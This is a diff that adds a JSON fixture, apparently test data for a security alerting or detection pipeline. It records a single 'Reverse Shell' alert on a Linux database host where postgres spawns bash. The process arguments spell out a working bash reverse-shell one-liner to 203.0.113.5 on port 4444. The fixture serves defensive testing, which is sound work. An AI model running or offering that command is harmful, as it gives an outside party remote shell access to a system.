@@ -1,0 +1,15 @@
+{
+  "events": [
+    {
+      "alert": {"id": "AL-LNX-300", "level": 12, "name": "Reverse Shell", "timestamp": 1700002000, "mitre": ["T1059.004"]},
+      "host": {"hostname": "LNX-DB-01", "ip": "10.0.0.15", "os": "Linux"},
+      "user": {"username": "postgres", "admin": false},
+      "process": {
+        "pid": 22100, "start_time": 1700002000, "name": "bash",
+        "args": "bash -i >& /dev/tcp/203.0.113.5/4444 0>&1",
+        "parent": {"pid": 22099, "start_time": 1700001990, "name": "postgres"}
+      },
+      "network": [{"dest_ip": "203.0.113.5", "dest_port": 4444, "protocol": "TCP"}]
+    }
+  ]
+}
